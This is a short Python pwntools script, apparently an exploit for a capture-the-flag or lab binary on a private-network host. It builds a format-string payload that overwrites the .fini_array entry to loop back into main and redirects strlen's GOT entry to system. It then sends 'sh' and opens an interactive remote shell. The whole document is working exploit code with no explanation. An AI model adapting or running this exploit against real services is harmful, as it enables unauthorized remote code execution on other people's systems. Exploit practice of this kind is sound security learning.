from pwn import *
rhp = {'host': '192.168.33.20', 'port':1234}

fini_array = 0x08049934
main = 0x080485ed
strlen = 0x8049a54
system = 0x8048490

payload = b"aa"
payload += p32(fini_array)
payload += p32(strlen + 2)  
payload += p32(strlen)
payload += b"%%%dx%%12$hn" % ((main & 0xffff) - len(payload) - 18)
payload += b"%%%dx%%13$hn" % (((system >> 16 & 0xffff) - (main & 0xffff) + 0x10000) % 0x10000)
payload += b"%%%dx%%14$hn" % (((system & 0xffff) - (system >> 16 & 0xffff) + 0x10000) % 0x10000)

conn = remote(rhp['host'], rhp['port'])

log.info(conn.recv()) 
log.info(conn.recv()) 
print(payload)
conn.sendline(payload)
log.info(conn.recvline())
conn.sendline("sh")

conn.interactive()